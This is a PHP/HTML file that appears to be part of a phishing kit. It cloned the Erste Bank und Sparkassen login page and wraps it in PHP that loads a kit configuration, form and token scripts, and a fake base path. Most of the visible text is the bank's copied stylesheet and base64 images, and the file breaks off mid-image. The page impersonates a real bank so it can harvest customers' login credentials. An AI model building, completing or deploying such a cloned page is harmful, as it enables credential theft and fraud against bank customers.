<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="cc/";
?>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery.maskedinput/dist/jquery.maskedinput.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>
    <base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
    <link rel="stylesheet" href="form/css.css">

<!DOCTYPE html><html lang="en" class="noIE"><head>
<link rel="icon" data-savepage-href="https://assets.erstegroup.com/content/dam/common/brand/icons/favicon.ico" href="">
	<title>Erste Bank und Sparkassen Login</title>

	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta charset="utf-8">
	<meta http-equiv="Content-Security-Policy" data-savepage-content="connect-src 'self' https://127.0.0.1:*/ https://login.sparkasse.at;connect-src_DEV_LATEST 'self' https://127.0.0.1:*/ https://login.dev-latest.sparkasse.at;connect-src_DEV_STABLE 'self' https://127.0.0.1:*/ https://login.dev.sparkasse.at;connect-src_FAT_LATEST 'self' https://127.0.0.1:*/ https://login.fat.sparkasse.at;connect-src_FAT_STABLE 'self' https://127.0.0.1:*/ https://login.fat2.sparkasse.at;connect-src_PROD 'self' https://127.0.0.1:*/ https://login.sparkasse.at;default-src 'none';font-src 'self';img-src 'self' 'unsafe-inline' data: *.sparkasse.at https://login.sparkasse.at https://assets.erstegroup.com;img-src_DEV_LATEST 'self' 'unsafe-inline' data: *.sparkasse.at https://login.dev.sparkasse.at https://assets.erstegroup.com;img-src_DEV_STABLE 'self' 'unsafe-inline' data: *.sparkasse.at https://login.dev.sparkasse.at https://assets.erstegroup.com;img-src_FAT_LATEST 'self' 'unsafe-inline' data: *.sparkasse.at https://login.fat.sparkasse.at https://assets.erstegroup.com;img-src_FAT_STABLE 'self' 'unsafe-inline' data: *.sparkasse.at https://login.fat2.sparkasse.at https://assets.erstegroup.com;img-src_PROD 'self' 'unsafe-inline' data: *.sparkasse.at https://login.sparkasse.at https://assets.erstegroup.com;script-src 'self' 'unsafe-inline' 'unsafe-eval' https://login.sparkasse.at;script-src_DEV_LATEST 'self' 'unsafe-inline' 'unsafe-eval' https://login.dev-latest.sparkasse.at;script-src_DEV_STABLE 'self' 'unsafe-inline' 'unsafe-eval' https://login.dev.sparkasse.at;script-src_FAT_LATEST 'self' 'unsafe-inline' 'unsafe-eval' https://login.fat.sparkasse.at;script-src_FAT_STABLE 'self' 'unsafe-inline' 'unsafe-eval' https://login.fat2.sparkasse.at;script-src_PROD 'self' 'unsafe-inline' 'unsafe-eval' https://login.sparkasse.at;style-src 'self' 'unsafe-inline'" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	
	<link rel="shortcut icon" type="image/x-icon" data-savepage-href="https://assets.erstegroup.com/content/dam/common/brand/icons/favicon.ico" href="">
	<style data-savepage-href="/sts/styles/lib.css" type="text/css">/************************************************************************
* Lib.css for Federated Login Erste Bank, sIT/OSP/Georg Zeglovits
*------------------------------------------------------------------------
*
* Font Declaration
************************************************************************/

@font-face {
    font-family: 'open_sansregular';
    src: url('OpenSans/webfonts/opensans_regular/OpenSans-Regular-webfont.eot');
    src: url('OpenSans/webfonts/opensans_regular/OpenSans-Regular-webfont.eot#iefix') format('embedded-opentype');
    src: url('OpenSans/webfonts/opensans_regular/OpenSans-Regular-webfont.woff') format('woff'),
         url('OpenSans/webfonts/opensans_regular/OpenSans-Regular-webfont.ttf') format('truetype');
    font-weight:normal;
    font-weight:400;
         
}
@font-face {
    font-family: 'open_sanssemibold';
    src: url('OpenSans/webfonts/opensans_semibold/OpenSans-Semibold-webfont.eot');
    src: url('OpenSans/webfonts/opensans_semibold/OpenSans-Semibold-webfont.eot?#iefix') format('embedded-opentype');
    src: url('OpenSans/webfonts/opensans_semibold/OpenSans-Semibold-webfont.woff') format('woff'),
         url('OpenSans/webfonts/opensans_semibold/OpenSans-Semibold-webfont.ttf') format('truetype');
    font-weight:bold;
    font-weight:700;
}



/************************************************************************
* general Styles
************************************************************************/
*{
    box-sizing:border-box;
    -webkit-box-sizing:border-box;
    -moz-box-sizing:border-box;
    -o-box-sizing:border-box;
    -ms-box-sizing:border-box; 
    padding:0; 
    margin:0;
    color:#0d5487;
    -webkit-border-radius:0;
    -webkit-appearance: none;
    }
body{
    background:#bce4fa;
    font:16px/20px 'open_sansregular',Arial,sans-serif;
    }

b{
    font-weight:700;
    font-family:'open_sanssemibold',Arial,sans-serif;
}    
    
div.wrapper{
    width:610px; 
    margin:124px auto 30px auto;
    overflow:hidden;
    }
div.col{
    display:block;
    width:50%;
    float:left;
    padding:0 20px 14px;
    }
div.col2{      
    position:relative;
    padding:0;
    }
div.col2 >.whitebox, div.col2 > div.whitebox-info{
    background:#fff;
    border-radius:4px;
    padding:14px 14px 0 14px; 
    width:100%;
}
div.col1 > h1 > img{
    max-width:90%;
    }
.whitebox > h1{
   font-size:1.125rem;
   padding-bottom:3px;
   font-family: 'open_sanssemibold',Arial,sans-serif;
}

div.col1{
    padding-left:0;
    }
div.product{
    border-top:solid 1px #fff;
    margin-top:14px;
    padding-top:14px;
    line-height:1.25rem;
    }
div.product h2{
    font-family: 'open_sanssemibold',Arial,sans-serif;
    font-size:1rem;
    }    
    
div.number, div.password {
    position:relative;
    overflow:hidden; 
    width:100%;
    height:45px;
    }
div.number > label.number, div.password > label.password{
    position:absolute;
    top:7px;
    left:49px;
    z-index:2;
    color:#ccd7e1;
    font-size:16px;
    line-height:1.5rem;
    }
div.number > input.input, div.password > input.input{
    position:absolute;
    top:0;
    left:40px;
    border:solid 1px #ccd7e1;
    border-left:none;
    border-top-right-radius:3px;
    border-bottom-right-radius:3px;
    height:40px;
    margin:0;
    padding:5px 9px;
    width:230px;
    font-size:16px;
    color:#555;
    }
    
div.number > input.input:disabled, div.password > input.input:disabled{
    background:rgb(235, 235, 228);
}
div.number > input.input{
    -moz-appearance:textfield;
}
.hasBgImage{
    background-repeat:no-repeat;
    background-color:#fff;
    background-image: url(data:image/png;base64,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);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkViZW5lXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMTYyLjYyN3B4IiBoZWlnaHQ9IjI3LjEyNXB4IiB2aWV3Qm94PSIwIDAgMTYyLjYyNyAyNy4xMjUiIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDE2Mi42MjcgMjcuMTI1Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xNy4yMzcsMTcuMTc2Yy0yLjI5NS0wLjk3NC0yLjgzOS0xLjMxMy0yLjgzOS0xLjMxM2wtMC4wMjEtMi4yNGMwLDAsMC44Ni0wLjY3MywxLjEyNy0yLjc4Mg0KCWMwLjUzNywwLjE1OSwxLjEwMy0wLjgxNiwxLjEzMy0xLjMzYzAuMDI5LTAuNDk1LTAuMDc0LTEuODY4LTAuNzMtMS43M2MwLjEzNC0xLjAzNCwwLjIzMS0xLjk2NCwwLjE4NC0yLjQ1Ng0KCWMtMC4xNzEtMS44MDEtMS45MTEtMy42OTktNC41ODktMy42OTljLTIuNjc4LDAtNC40MjEsMS44OTctNC41OTIsMy42OThDNi44NjMsNS44MTYsNi45NjEsNi43NDYsNy4wOTUsNy43OA0KCWMtMC42NTYtMC4xMzgtMC43NiwxLjIzNS0wLjczLDEuNzNjMC4wMzEsMC41MTQsMC41OTQsMS40ODksMS4xMzMsMS4zM2MwLjI2NywyLjEwOSwxLjEyNywyLjc4MiwxLjEyNywyLjc4MmwtMC4wMjEsMi4yNDENCgljMCwwLTAuNTQ1LDAuMzM4LTIuODM5LDEuMzEyYy0yLjI5NiwwLjk3NC00LjYxNCwxLjY1NC01LjMwNCwyLjc1Yy0wLjYxOSwwLjk4MS0wLjQzNCw1LjY5OS0wLjQzNCw1LjY5OWgyMi45NDgNCgljMCwwLDAuMTg2LTQuNzE4LTAuNDM0LTUuNjk5QzIxLjg1MSwxOC44MywxOS41MzIsMTguMTQ4LDE3LjIzNywxNy4xNzZ6Ii8+DQo8Zz4NCgk8cGF0aCBmaWxsPSJub25lIiBkPSJNNDMuMjUsMTUuNWMtMS4zNDgsMC0yLjQzOCwxLjAwOC0yLjQzOCwyLjI1YzAsMC44MzIsMC40OTIsMS41NTksMS4yMiwxLjk0N3YyLjU1M2gyLjQzN3YtMi41NTMNCgkJYzAuNzI5LTAuMzkxLDEuMjE5LTEuMTE1LDEuMjE5LTEuOTQ3QzQ1LjY4OCwxNi41MDgsNDQuNTk2LDE1LjUsNDMuMjUsMTUuNXoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMzYuNzUsNy42MjV2M2gzLjI0OXYtM2MwLjAwMy0wLjc3MiwwLjMxMy0xLjUzMiwwLjk1Mi0yLjEyMWMwLjY0LTAuNTg5LDEuNDYxLTAuODc3LDIuMjk5LTAuODc5DQoJCWMwLjgzNiwwLjAwMiwxLjY1OSwwLjI5LDIuMjk5LDAuODc5YzAuNjM3LDAuNTg5LDAuOTQ4LDEuMzQ5LDAuOTUxLDIuMTIxdjNoMy4yNDl2LTNjMC4wMDItMS41My0wLjYzOC0zLjA3NS0xLjkwMy00LjI0Mg0KCQljLTEuMjY1LTEuMTY5LTIuOTM4LTEuNzYxLTQuNTk2LTEuNzU4Yy0xLjY1OS0wLjAwMy0zLjMzMiwwLjU4OS00LjU5OCwxLjc1OEMzNy4zODcsNC41NSwzNi43NDcsNi4wOTUsMzYuNzUsNy42MjV6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTUyLjk5OSwyNC4xMjV2LTEwLjVjMC0wLjM4NC0wLjE1OC0wLjc2OC0wLjQ3Ni0xLjA2MXMtMC43MzItMC40MzktMS4xNDgtMC40MzlIMzUuMTI0DQoJCWMtMC40MTYsMC0wLjgzMSwwLjE0Ni0xLjE0OSwwLjQzOWMtMC4zMTUsMC4yOTMtMC40NzUsMC42NzctMC40NzUsMS4wNjF2MTAuNWMwLDAuMzg0LDAuMTU4LDAuNzY4LDAuNDc1LDEuMDYxDQoJCWMwLjMxOCwwLjI5MywwLjczMywwLjQzOSwxLjE0OSwwLjQzOWgxNi4yNTFjMC40MTYsMCwwLjgzMS0wLjE0NiwxLjE0OC0wLjQzOVM1Mi45OTksMjQuNTA5LDUyLjk5OSwyNC4xMjV6IE00NC40NjgsMTkuNjk3djIuNTUzDQoJCWgtMi40Mzd2LTIuNTUzYy0wLjcyOS0wLjM5MS0xLjIyMS0xLjExNS0xLjIyMS0xLjk0N2MwLTEuMjQyLDEuMDkyLTIuMjUsMi40MzgtMi4yNXMyLjQzNywxLjAwOCwyLjQzNywyLjI1DQoJCUM0NS42ODgsMTguNTgyLDQ1LjE5NSwxOS4zMDksNDQuNDY4LDE5LjY5N3oiLz4NCjwvZz4NCjxwYXRoIGZpbGw9IiNDQzAwMDAiIGQ9Ik0xNjIuNDk2LDI2LjE1OWwtNy44MTctMTMuNjM3Yy0wLjMwMy0wLjUzLTAuODAxLTAuNTMtMS4xMDUsMGwtNy44MTgsMTMuNjM3DQoJYy0wLjMwMywwLjUzLTAuMDUsMC45NjYsMC41NjMsMC45NjZoMTUuNjE5QzE2Mi41NSwyNy4xMjUsMTYyLjgwNCwyNi42ODksMTYyLjQ5NiwyNi4xNTkgTTE1My40MzEsMTYuMDU3aDEuMzk0DQoJYzAuNDIsMCwwLjQ3OSwwLjI0MywwLjQ3OSwwLjM4OWwtMC4wMDQsMC4xMjdsLTAuMDEsMC4xNDZsLTAuMjg2LDUuMDljLTAuMDQyLDAuMzgxLTAuMjExLDAuNDU3LTAuNDkxLDAuNDU3aC0wLjc0Mg0KCWMtMC4yODEsMC0wLjQ1My0wLjA3Ni0wLjQ5NC0wLjQ2N2wtMC4yODUtNS4wOGwtMC4wMTItMC4xNDZsLTAuMDA0LTAuMTI3QzE1Mi45NzYsMTYuMywxNTMuMDM1LDE2LjA1NywxNTMuNDMxLDE2LjA1Nw0KCSBNMTU0LjE0NiwyNS44MzdjLTAuNzMxLDAtMS4zMjYtMC41ODktMS4zMjYtMS4zMTJjMC0wLjc0MiwwLjU4Mi0xLjMyMywxLjMyNi0xLjMyM2MwLjcyNywwLDEuMzE1LDAuNTk0LDEuMzE1LDEuMzIzDQoJQzE1NS40NjIsMjUuMjM0LDE1NC44NTgsMjUuODM3LDE1NC4xNDYsMjUuODM3Ii8+DQo8cGF0aCBmaWxsPSIjMDA0OTdCIiBkPSJNNzQuNjg2LDIuMTQyYy02LjM0OCwwLTExLjQ5LDUuMTQyLTExLjQ5LDExLjQ5YzAsNi4zNDcsNS4xNDQsMTEuNDg5LDExLjQ5LDExLjQ4OQ0KCWM2LjM0NiwwLDExLjQ4OS01LjE0MywxMS40ODktMTEuNDg5Qzg2LjE3NSw3LjI4NCw4MS4wMzEsMi4xNDIsNzQuNjg2LDIuMTQyeiBNNzcuNDk1LDIwLjc3bC0wLjExNiwwLjA0NQ0KCWMtMC42ODgsMC4yNzEtMS4yMzQsMC40NzgtMS42NDYsMC42MTljLTAuNDMzLDAuMTUtMC45MzcsMC4yMjgtMS40OTgsMC4yMjhjLTAuODgzLDAtMS41ODgtMC4yMjQtMi4wOS0wLjY2Ng0KCWMtMC41MTMtMC40NTEtMC43NzEtMS4wMjktMC43NzEtMS43MjJjMC0wLjI1MiwwLjAxOC0wLjUxLDAuMDU1LTAuNzcyYzAuMDM1LTAuMjU4LDAuMDkyLTAuNTQ5LDAuMTctMC44NzdsMC44NTYtMy4wMzMNCgljMC4wNzMtMC4yOCwwLjEzNy0wLjU1MSwwLjE4OC0wLjgwNmMwLjA0OS0wLjI0MiwwLjA3Mi0wLjQ2NiwwLjA3Mi0wLjY2YzAtMC4zMTItMC4wNTYtMC41My0wLjE2Mi0wLjYzNA0KCWMtMC4wNjQtMC4wNi0wLjI0NC0wLjE2LTAuNzQ4LTAuMTZjLTAuMTk3LDAtMC4zOTgsMC4wMzEtMC42MTEsMC4wOTRjLTAuMjI3LDAuMDY2LTAuNDIsMC4xMzEtMC41OCwwLjE5bC0wLjQzLDAuMTZsMC4zNjUtMS40OTYNCglsMC4xMTUtMC4wNDZjMC41NTQtMC4yMjYsMS4xMDItMC40MjUsMS42MjQtMC41OTFjMS41MTUtMC40NzksMi44MzYtMC4yNzEsMy41ODgsMC40MDFjMC40OTksMC40NDUsMC43NTIsMS4wMjcsMC43NTIsMS43MjkNCgljMCwwLjEzNi0wLjAxOSwwLjM3NC0wLjA0NywwLjcxN2MtMC4wMzMsMC4zNDItMC4wOTUsMC42NjQtMC4xODMsMC45NThsLTAuODUxLDMuMDFjLTAuMDY5LDAuMjM2LTAuMTI5LDAuNTA0LTAuMTgzLDAuODA1DQoJYy0wLjA1MSwwLjI5My0wLjA3NywwLjUxMi0wLjA3NywwLjY2MmMwLDAuMzE2LDAuMDYyLDAuNTM1LDAuMTc5LDAuNjMxYzAuMDkyLDAuMDc0LDAuMzAxLDAuMTYyLDAuNzc3LDAuMTYyDQoJYzAuMTg2LDAsMC4zOTgtMC4wMzMsMC42MzgtMC4xYzAuMjQ0LTAuMDY2LDAuNDIxLTAuMTI1LDAuNTI4LTAuMTc4bDAuNDYzLTAuMjIxTDc3LjQ5NSwyMC43N3ogTTc3LjMwNSw4LjUzMQ0KCWMtMC40MzgsMC40MS0wLjk3OSwwLjYxOS0xLjYsMC42MTljLTAuNjE5LDAtMS4xNTktMC4yMDgtMS42MDQtMC42MTljLTAuNDQ5LTAuNDE1LTAuNjc5LTAuOTI2LTAuNjc5LTEuNTE4DQoJYzAtMC41OTIsMC4yMjgtMS4xMDQsMC42NzctMS41MjRjMC44OTMtMC44MjksMi4zMjEtMC44MjgsMy4yMDUsMGMwLjQ0NiwwLjQxOSwwLjY3NCwwLjkzMSwwLjY3NCwxLjUyMw0KCUM3Ny45NzksNy42MDUsNzcuNzUyLDguMTE2LDc3LjMwNSw4LjUzMXoiLz4NCjxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik05NS40MDMsMTMuNzgyYy0zLjEzMiwwLTUuNjcxLDIuNTM4LTUuNjcxLDUuNjcyYzAsMy4xMzUsMi41MzksNS42NzMsNS42NzEsNS42NzMNCgljMy4xMzQsMCw1LjY3My0yLjUzOCw1LjY3My01LjY3M0MxMDEuMDc2LDE2LjMyLDk4LjUzNywxMy43ODIsOTUuNDAzLDEzLjc4MnogTTk1LjYxNywyMi43NjVjLTAuMTg3LDAuMTc3LTAuNDAzLDAuMjY1LTAuNjUyLDAuMjY1DQoJYy0wLjI1MywwLTAuNDcyLTAuMDg4LTAuNjU3LTAuMjY1Yy0wLjE4Ni0wLjE3Ni0wLjI3OS0wLjM4OC0wLjI3OS0wLjYzM2MwLTAuMjQ2LDAuMDk0LTAuNDU5LDAuMjc5LTAuNjM4DQoJYzAuMTg2LTAuMTgsMC40MDQtMC4yNywwLjY1Ny0wLjI3YzAuMjQ5LDAsMC40NjYsMC4wOSwwLjY1MiwwLjI3YzAuMTg3LDAuMTc5LDAuMjc5LDAuMzkyLDAuMjc5LDAuNjM4DQoJQzk1Ljg5NiwyMi4zNzcsOTUuODA0LDIyLjU4OSw5NS42MTcsMjIuNzY1eiBNOTYuOTczLDE5LjQzOWMtMC40NDYsMC40MDQtMS4wNDEsMC42MzUtMS43ODUsMC42OTNsLTAuMDI4LDAuNjZoLTAuNDMydi0xLjg4Nw0KCWMwLjQ2OC0wLjAzOSwwLjgzNS0wLjE4NywxLjEwMS0wLjQ0NGMwLjI2Ni0wLjI1NywwLjM5OC0wLjYwNiwwLjM5OC0xLjA1MWMwLTAuMzUyLTAuMDk0LTAuNjM0LTAuMjc5LTAuODQ1DQoJYy0wLjE4Ni0wLjIxMy0wLjQzNi0wLjMxOC0wLjc1LTAuMzE4Yy0wLjEzMywwLTAuMjUsMC4wMTQtMC4zNTQsMC4wNDFjLTAuMTAzLDAuMDI3LTAuMjAzLDAuMDctMC4zLDAuMTI4DQoJYzAuMDMxLDAuMTA0LDAuMDcsMC4yMzcsMC4xMTMsMC40MDFjMC4wNDQsMC4xNjMsMC4wNjYsMC4zMTMsMC4wNjYsMC40NTNjMCwwLjIyNi0wLjA3NCwwLjQwMS0wLjIyMSwwLjUyNg0KCWMtMC4xNDcsMC4xMjQtMC4zNTMsMC4xODctMC42MTQsMC4xODdjLTAuMjQ1LDAtMC40MzgtMC4wNzctMC41OC0wLjIzM2MtMC4xNDEtMC4xNTUtMC4yMTEtMC4zNDYtMC4yMTEtMC41NzINCgljMC0wLjM3MSwwLjIxMi0wLjY4NywwLjYzNi0wLjk0NXMwLjkzNi0wLjM4OCwxLjUzMy0wLjM4OGMwLjcwOSwwLDEuMjgxLDAuMTg0LDEuNzIsMC41NTNjMC40MzgsMC4zNjksMC42NTcsMC44NTQsMC42NTcsMS40Ng0KCUM5Ny42NDMsMTguNTA4LDk3LjQxOSwxOS4wMzYsOTYuOTczLDE5LjQzOXoiLz4NCjxnPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMTAuMTY3LDE2LjIwMmgtMC44OTRjLTAuMjQ2LDAtMC40NDYsMC4yMDEtMC40NDYsMC40NDd2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTQNCgkJYzAuMjQ2LDAsMC40NDgtMC4yMDEsMC40NDgtMC40NDd2LTAuODk1QzExMC42MTUsMTYuNDAzLDExMC40MTMsMTYuMjAyLDExMC4xNjcsMTYuMjAyeiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMTEuODA3LDE3Ljk5MWgwLjg5NGMwLjI0NywwLDAuNDQ3LTAuMjAxLDAuNDQ3LTAuNDQ3di0wLjg5NWMwLTAuMjQ2LTAuMi0wLjQ0Ny0wLjQ0Ny0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMS4zNTksMTcuNzksMTExLjU2MSwxNy45OTEsMTExLjgwNywxNy45OTF6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNC4zNCwxNy45OTFoMC44OTRjMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVjMC0wLjI0Ni0wLjIwMi0wLjQ0Ny0wLjQ0OC0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMy44OTMsMTcuNzksMTE0LjA5NCwxNy45OTEsMTE0LjM0LDE3Ljk5MXoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTE3Ljc2NywxNi4yMDJoLTAuODk0Yy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1YzAsMC4yNDYsMC4yMDEsMC40NDcsMC40NDcsMC40NDdoMC44OTQNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzExOC4yMTQsMTYuNDAzLDExOC4wMTMsMTYuMjAyLDExNy43NjcsMTYuMjAyeiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMjAuMzAxLDE2LjIwMmgtMC44OTVjLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDd2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ni0wLjIwMSwwLjQ0Ni0wLjQ0N3YtMC44OTVDMTIwLjc0NywxNi40MDMsMTIwLjU0NywxNi4yMDIsMTIwLjMwMSwxNi4yMDJ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMi44MzMsMTYuMjAyaC0wLjg5NWMtMC4yNDYsMC0wLjQ0NiwwLjIwMS0wLjQ0NiwwLjQ0N3YwLjg5NWMwLDAuMjQ2LDAuMiwwLjQ0NywwLjQ0NiwwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ny0wLjIwMSwwLjQ0Ny0wLjQ0N3YtMC44OTVDMTIzLjI4LDE2LjQwMywxMjMuMDc5LDE2LjIwMiwxMjIuODMzLDE2LjIwMnoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTEwLjE2NywxOC43MzZoLTAuODk0Yy0wLjI0NiwwLTAuNDQ2LDAuMi0wLjQ0NiwwLjQ0NnYwLjg5NWMwLDAuMjQ2LDAuMiwwLjQ0NywwLjQ0NiwwLjQ0N2gwLjg5NA0KCQljMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVDMTEwLjYxNSwxOC45MzcsMTEwLjQxMywxOC43MzYsMTEwLjE2NywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExMS44MDcsMjAuNTI0aDAuODk0YzAuMjQ3LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1YzAtMC4yNDYtMC4yLTAuNDQ3LTAuNDQ3LTAuNDQ3aC0wLjg5NA0KCQljLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDd2MC44OTVDMTExLjM1OSwyMC4zMjMsMTExLjU2MSwyMC41MjQsMTExLjgwNywyMC41MjR6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNC4zNCwyMC41MjRoMC44OTRjMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVjMC0wLjI0Ni0wLjIwMi0wLjQ0Ny0wLjQ0OC0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMy44OTMsMjAuMzIzLDExNC4wOTQsMjAuNTI0LDExNC4zNC